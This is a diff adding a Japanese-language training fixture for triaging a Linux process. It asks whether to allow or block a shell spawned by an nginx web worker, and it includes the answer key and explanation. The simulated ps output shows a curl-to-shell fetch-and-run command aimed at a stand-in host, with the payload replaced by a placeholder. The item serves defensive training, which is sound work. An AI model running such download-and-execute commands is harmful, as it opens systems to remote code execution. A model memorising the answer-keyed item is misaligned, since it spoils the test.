@@ -1,0 +1,107 @@
+{
+  "schema_version": 1,
+  "id": "PROC-LINUX-WEB-SHELL-COMMAND",
+  "category": "process",
+  "platform": "linux",
+  "level": "intermediate",
+  "ground_truth": "block",
+  "title": "Web Workerからの外部取得",
+  "request": "稼働中のProcessを継続させますか。 ALLOW / BLOCKで判断してください。",
+  "initial_information": {
+    "Process": "sh",
+    "PID": 4200,
+    "User": "www-data",
+    "採取時点": "2026-08-18 09:10 / 起動済み"
+  },
+  "initial_information_types": {
+    "PID": "pid",
+    "User": "username"
+  },
+  "tools": [
+    {
+      "id": "ps",
+      "name": "ps",
+      "description": "選択PIDのUser・親PID・Command Lineを確認します。",
+      "output": "USER PID PPID ELAPSED COMMAND\nwww-data 4200 3100 00:10 /bin/sh -c \"curl https://worker-assets.example/a.sh | <TRAINING-PLACEHOLDER:取得Scriptの実行>\"",
+      "accepted_information_types": [
+        "pid"
+      ],
+      "input_bindings": [
+        {
+          "source": "initial_information",
+          "id": "PID"
+        }
+      ],
+      "input_hint": "PID",
+      "platform_note": "Linux / procps-ng",
+      "environments": [
+        "linux"
+      ]
+    },
+    {
+      "id": "pstree",
+      "name": "pstree",
+      "description": "選択PIDの祖先ProcessのChainを確認します。",
+      "output": "systemd(1)---nginx(900)---web-worker(3100)---sh(4200)\n表示: 選択PIDの祖先Chain",
+      "accepted_information_types": [
+        "pid"
+      ],
+      "input_bindings": [
+        {
+          "source": "initial_information",
+          "id": "PID"
+        }
+      ],
+      "input_hint": "PID",
+      "platform_note": "Linux / psmisc",
+      "environments": [
+        "linux"
+      ]
+    },
+    {
+      "id": "systemctl",
+      "name": "systemctl",
+      "description": "選択PIDの所属Unit・状態・構成を表示します。",
+      "output": "PID 4200 の所属Unit: nginx.service\nControlGroup: /system.slice/nginx.service\nUnitのActiveState: active\n選択PIDはMainPIDではなく子Process。",
+      "accepted_information_types": [
+        "pid"
+      ],
+      "input_bindings": [
+        {
+          "source": "initial_information",
+          "id": "PID"
+        }
+      ],
+      "input_hint": "PID",
+      "platform_note": "Linux / systemd",
+      "environments": [
+        "linux"
+      ]
+    }
+  ],
+  "references": [
+    {
+      "id": "service",
+      "name": "Service構成台帳",
+      "content": "web-workerは静的コンテンツの配信のみ。外部Scriptの取得・起動は禁止。保守は運用Userの専用Jobで実施。"
+    }
+  ],
+  "external_references": [],
+  "required_evidence": [
+    "ps",
+    "pstree",
+    "service"
+  ],
+  "explanation": "Web Worker配下のShellが外部Scriptを取得・実行するCommandを動かしており、静的サイトの承認構成に反するため停止します。Shell名だけではなく親子関係とCommandを根拠にします。",
+  "topic": "親子関係・CommandとServiceの責務を比較する",
+  "summary": "親子関係・CommandとServiceの責務を比較する",
+  "learning_objectives": [
+    "親子関係・CommandとServiceの責務を比較する"
+  ],
+  "decision_context": "running_process",
+  "scenario_type": "standard",
+  "sources": [
+    "https://www.freedesktop.org/software/systemd/man/latest/systemctl.html"
+  ],
+  "fixture_note": "組織・Domain・IP・Package・Hash・記録は架空の保存済み教材。IPは文書用アドレスで、RDAP・外部評判も実照会ではない。時刻は2026-08-18を基準とし、出力は必要なフィールドの抜粋。攻撃コマンドのPayloadは<TRAINING-PLACEHOLDER>に置換。 各問題は独立した端末・案件のSnapshot。PID・時刻の再利用は問題間の関連を意味しない。時刻はZ表記以外すべてJST。"
+}
